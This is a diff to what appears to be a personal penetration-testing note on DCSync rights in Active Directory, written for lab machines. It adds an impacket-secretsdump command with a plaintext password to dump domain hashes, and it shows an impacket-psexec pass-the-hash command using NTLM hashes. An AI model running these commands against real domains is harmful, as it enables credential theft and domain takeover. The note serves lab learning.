@@ -2,8 +2,12 @@
 DCSync rights are particularly powerful in Active Directory environments. When you grant DCSync rights to a user, you’re essentially giving them the ability to impersonate a domain controller and request password data for any user in the domain. This is the same mechanism that domain controllers use to replicate password data between each other. With these rights, we can retrieve password hashes for any account — including administrator accounts — which is why it’s such a powerful privilege escalation technique. In a real environment, only domain controllers and a few other specifically designated accounts should have these rights.
 
 ---
+##### Password Auth
 
-## PoC
+```
+impacket-secretsdump administrator.htb/Ethan:'limpbizkit'@administrator.htb
+```
+##### Kerberos Auth
 
 if we either have DCSync Rights or are an [Microsoft Virtual Account](Microsoft%20Virtual%20Account.md)(IIS APPPOOL) and requested an ticket. 
 
@@ -51,6 +55,5 @@ Connected to target system.
 
 ```
 impacket-psexec Administrator@g0.flight.htb -hashes aad3b435b51404eeaad3b435b51404ee:43bbfc530bab76141b12c8446e30c17c
-
 ```
 
